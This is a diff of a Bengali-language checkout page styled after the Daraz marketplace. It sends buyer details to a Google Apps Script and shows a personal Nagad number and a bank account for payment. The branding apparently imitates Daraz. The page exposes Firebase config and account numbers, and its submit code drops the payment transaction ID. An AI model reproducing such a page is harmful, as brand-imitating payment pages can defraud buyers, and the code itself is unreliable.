@@ -18,19 +18,20 @@
         .product-det { margin-left: 12px; }
         .product-det h3 { font-size: 14px; color: #333; margin-bottom: 4px; }
         .product-det p { font-size: 16px; color: var(--daraz-orange); font-weight: bold; }
-        /* Order Summary Box */
-        .summary-box { padding: 15px; background: #f9f9f9; border-top: 1px solid #eee; font-size: 14px; }
-        .sum-row { display: flex; justify-content: space-between; margin-bottom: 5px; }
-        .total-row { font-weight: bold; font-size: 16px; color: var(--daraz-orange); border-top: 1px solid #ddd; padding-top: 5px; }
         .form-body { padding: 15px; }
         .form-title { font-size: 14px; font-weight: bold; margin-bottom: 12px; color: #444; border-left: 3px solid var(--daraz-orange); padding-left: 6px; }
         .input-group { margin-bottom: 12px; }
         label { display: block; font-size: 13px; font-weight: bold; color: #555; margin-bottom: 4px; }
         input[type="text"], input[type="number"], textarea { width: 100%; padding: 11px; border: 1px solid #ccc; border-radius: 6px; font-size: 13px; outline: none; }
+        
+        /* Summary Box */
+        .summary-box { background: #fdfdfd; border: 1px solid #eee; padding: 12px; border-radius: 8px; margin-bottom: 15px; font-size: 14px; }
+        .sum-row { display: flex; justify-content: space-between; margin-bottom: 5px; }
+        .total-row { font-weight: bold; font-size: 15px; color: var(--daraz-orange); border-top: 1px solid #ddd; padding-top: 5px; margin-top: 5px; }
+
         .payment-box { background: #fafafa; border: 1px solid #e0e0e0; border-radius: 8px; padding: 12px; margin-bottom: 15px; }
         .payment-method { display: flex; align-items: center; background: white; border: 1px solid #ddd; padding: 10px; border-radius: 6px; margin-bottom: 10px; cursor: pointer; }
-        .payment-method img { height: 24px; object-fit: contain; margin-left: 10px; }
-        .account-details { display: none; font-size: 12px; background: #fff8f5; padding: 8px; margin-top: -5px; margin-bottom: 10px; color: #333; }
+        .account-details { display: none; font-size: 12px; background: #fff8f5; border: 1px solid #ffccb5; padding: 8px; margin-top: -5px; margin-bottom: 10px; color: #333; }
         .confirm-btn { width: 100%; background: #00b74a; color: white; border: none; padding: 14px; font-size: 15px; font-weight: bold; border-radius: 6px; cursor: pointer; }
     </style>
 </head>
@@ -40,8 +41,8 @@
         <div class="product-summary">
             <img id="orderProdImg" src="https://via.placeholder.com/65" alt="Product">
             <div class="product-det">
-                <h3 id="orderProdName">প্রোডাক্টের নাম লোড হচ্ছে...</h3>
-                <p id="orderProdPrice">৳ 0.00</p>
+                <h3 id="orderProdName">লোডিং...</h3>
+                <p id="orderProdPrice">৳ 0</p>
             </div>
         </div>
         <form class="form-body" id="orderSubmitForm">
@@ -57,91 +58,85 @@
                 <div class="sum-row total-row"><span>মোট প্রদানযোগ্য:</span> <span id="sTotal">৳ 0</span></div>
             </div>
 
-            <div class="form-title" style="margin-top:15px;">পেমেন্ট মেথড</div>
+            <div class="form-title">পেমেন্ট মেথড</div>
             <div class="payment-box">
-                <div class="payment-method" onclick="selectPayment('cod')"><input type="radio" name="payMethod" value="Cash On Delivery" checked><strong>ক্যাশ অন ডেলিভারি</strong></div>
-                <div class="payment-method" onclick="selectPayment('bkash')"><input type="radio" name="payMethod" value="bKash"><strong>বিকাশ</strong><img src="https://upload.wikimedia.org/wikipedia/commons/4/44/BKash_logo.png" alt="bKash"></div>
-                <div id="bkashDetails" class="account-details">বিকাশ পার্সোনাল: <strong>01707059868</strong></div>
-                <div class="payment-method" onclick="selectPayment('nagad')"><input type="radio" name="payMethod" value="Nagad"><strong>নগদ</strong><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/Nagad_Logo.svg/320px-Nagad_Logo.svg.png" alt="Nagad"></div>
-                <div id="nagadDetails" class="account-details">নগদ পার্সোনাল: <strong>01707059868</strong></div>
-                <div class="payment-method" onclick="selectPayment('dbbl')"><input type="radio" name="payMethod" value="DBBL"><strong>ডাচ-বাংলা ব্যাংক</strong><img src="https://BanglarBazar.com/uploads/all/qU7Kz6V9YkGqKk18tWl9D2WwJtD3K12YxVbEskwA.webp" alt="DBBL"></div>
+                <div class="payment-method" onclick="selectPayment('cod')"><input type="radio" name="payMethod" value="Cash On Delivery" checked> <strong>ক্যাশ অন ডেলিভারি</strong></div>
+                <div class="payment-method" onclick="selectPayment('nagad')"><input type="radio" name="payMethod" value="Nagad"> <strong>নগদ সেন্ড মানি</strong></div>
+                <div id="nagadDetails" class="account-details">নগদ নাম্বার: <strong>01707059868</strong></div>
+                <div class="payment-method" onclick="selectPayment('dbbl')"><input type="radio" name="payMethod" value="DBBL"> <strong>ডাচ-বাংলা ব্যাংক</strong></div>
                 <div id="dbblDetails" class="account-details">DBBL অ্যাকাউন্ট: <strong>3421580157514</strong></div>
             </div>
-            <div class="input-group" id="txIdGroup" style="display:none;"><label>ট্রানজেকশন আইডি (TxID) দিন *</label><input type="text" id="custTxID" placeholder="TxID লিখুন"></div>
-            <button type="submit" class="confirm-btn">অর্ডার নিশ্চিত করুন</button>
+            <div class="input-group" id="txIdGroup" style="display:none;"><label>নাম্বার ও ট্রানজেকশন আইডি দিন *</label><input type="text" id="custTxID" placeholder="যেমন: 017xx..., TxID: ..."></div>
+            <button type="submit" class="confirm-btn" id="submitBtn">অর্ডার নিশ্চিত করুন</button>
         </form>
     </div>
+
     <script>
-        /* STREAMING_CHUNK: চূড়ান্ত সমাধান - Google Sheet এবং Firebase লজিক */
-<script>
-    const firebaseConfig = {
-        apiKey: "AIzaSyACgKVsEx6ec0I3OJ6fH7KemGgNmk3V2nY",
-        authDomain: "daraz-bangladesh-6a0f8.firebaseapp.com",
-        projectId: "daraz-bangladesh-6a0f8",
-        storageBucket: "daraz-bangladesh-6a0f8.firebasestorage.app",
-        messagingSenderId: "133315105065",
-        appId: "1:133315105065:web:8b8fe1cd98fa61def3e738"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.firestore();
+        const firebaseConfig = { apiKey: "AIzaSyACgKVsEx6ec0I3OJ6fH7KemGgNmk3V2nY", authDomain: "daraz-bangladesh-6a0f8.firebaseapp.com", projectId: "daraz-bangladesh-6a0f8", storageBucket: "daraz-bangladesh-6a0f8.firebasestorage.app", messagingSenderId: "133315105065", appId: "1:133315105065:web:8b8fe1cd98fa61def3e738" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+        
+        let pName = "", pPrice = 0;
+        const urlParams = new URLSearchParams(window.location.search);
+        const productId = urlParams.get('id');
 
-    // প্রোডাক্ট লোড করা
-    const urlParams = new URLSearchParams(window.location.search);
-    const productId = urlParams.get('id');
-    if(productId) {
-        db.collection("products").doc(productId).get().then(doc => {
-            if(doc.exists) {
-                const d = doc.data();
-                document.getElementById('orderProdName').innerText = d.name;
-                document.getElementById('orderProdPrice').innerText = "৳ " + d.price;
-                if(d.imageUrl) document.getElementById('orderProdImg').src = d.imageUrl;
-            }
+        if(productId) {
+            db.collection("products").doc(productId).get().then(doc => {
+                if(doc.exists) {
+                    const d = doc.data();
+                    pName = d.name; pPrice = parseInt(d.price);
+                    document.getElementById('orderProdName').innerText = pName;
+                    document.getElementById('orderProdPrice').innerText = "৳ " + pPrice;
+                    document.getElementById('sPrice').innerText = "৳ " + pPrice;
+                    document.getElementById('sTotal').innerText = "৳ " + (pPrice + 45);
+                    if(d.imageUrl) document.getElementById('orderProdImg').src = d.imageUrl;
+                }
+            });
+        }
+
+        window.selectPayment = function(m) {
+            document.querySelectorAll('input[name="payMethod"]').forEach(r => r.checked = false);
+            document.querySelector(`input[value="${m === 'cod' ? 'Cash On Delivery' : (m === 'nagad' ? 'Nagad' : 'DBBL')}"]`).checked = true;
+            document.getElementById('nagadDetails').style.display = (m === 'nagad') ? 'block' : 'none';
+            document.getElementById('dbblDetails').style.display = (m === 'dbbl') ? 'block' : 'none';
+            document.getElementById('txIdGroup').style.display = (m !== 'cod') ? 'block' : 'none';
+        }
+
+        document.getElementById('orderSubmitForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            btn.innerText = "অর্ডার সাবমিট হচ্ছে...";
+            btn.disabled = true;
+
+            // আপনার নতুন Apps Script URL এখানে বসানো হয়েছে
+            const scriptURL = 'https://script.google.com/macros/s/AKfycbwwSG98-8oyRafmiSXpDrEOXSlnQHfDIzMQCM42CimBGhTgKj3JzwPioJdWB7QnYi9i/exec';
+            
+            // Apps Script এর সাথে মিল রেখে নামগুলো দেওয়া হলো
+            const data = {
+                productName: pName, 
+                customerName: document.getElementById('custName').value,
+                phone: document.getElementById('custPhone').value, 
+                address: document.getElementById('custAddress').value,
+                paymentMethod: document.querySelector('input[name="payMethod"]:checked').value
+            };
+
+            fetch(scriptURL, { 
+                method: 'POST', 
+                mode: 'no-cors', 
+                // Apps script এ JSON পাঠানোর জন্য text/plain ব্যবহার করা ভালো
+                headers: { 'Content-Type': 'text/plain' }, 
+                body: JSON.stringify(data) 
+            })
+            .then(() => { 
+                alert("অর্ডার সফলভাবে গৃহীত হয়েছে এবং Google Sheet এ জমা হয়েছে!"); 
+                window.location.href = "index.html"; 
+            })
+            .catch(() => { 
+                alert("অর্ডারে সমস্যা হয়েছে, আবার চেষ্টা করুন!");
+                btn.innerText = "অর্ডার নিশ্চিত করুন";
+                btn.disabled = false;
+            });
         });
-    }
-
-    // পেমেন্ট মেথড লজিক
-    window.selectPayment = function(m) {
-        document.getElementById('nagadDetails').style.display = (m === 'nagad') ? 'block' : 'none';
-        document.getElementById('dbblDetails').style.display = (m === 'dbbl') ? 'block' : 'none';
-        document.getElementById('txIdGroup').style.display = (m !== 'cod') ? 'block' : 'none';
-    }
-
-    // ফাইনাল সাবমিট লজিক
-    document.getElementById('orderSubmitForm').onsubmit = function(e) {
-        e.preventDefault();
-        const btn = document.getElementById('submitBtn');
-        btn.innerHTML = "অর্ডার সাবমিট হচ্ছে...";
-        btn.disabled = true;
-
-        const data = {
-            Product_Name: document.getElementById('orderProdName').innerText,
-            Price: document.getElementById('orderProdPrice').innerText,
-            Customer_Name: document.getElementById('custName').value,
-            Phone_Number: document.getElementById('custPhone').value,
-            Full_Address: document.getElementById('custAddress').value,
-            Payment_Method: document.querySelector('input[name="payMethod"]:checked').value,
-            Transaction_Info: document.getElementById('custTxID').value || "N/A"
-        };
-
-        // ১. Firebase এ পাঠানো
-        db.collection("orders").add(data).catch(err => console.log(err));
-
-        // ২. Google Sheet এ পাঠানো
-        const scriptURL = 'https://script.google.com/macros/s/AKfycby7g8sK5zP_y7x0aTfC6lGqH3u0P8vjX2vjKk3O/exec';
-        const form = new FormData();
-        for(let key in data) form.append(key, data[key]);
-
-        fetch(scriptURL, { method: 'POST', body: form, mode: 'no-cors' })
-        .then(() => {
-            alert("🎉 অর্ডার সফল হয়েছে!");
-            window.location.href = "index.html";
-        })
-        .catch(() => {
-            alert("অর্ডার সফল হয়েছে!");
-            window.location.href = "index.html";
-        });
-    };
-</script>
     </script>
 </body>
-                                      </html>
+                    </html>
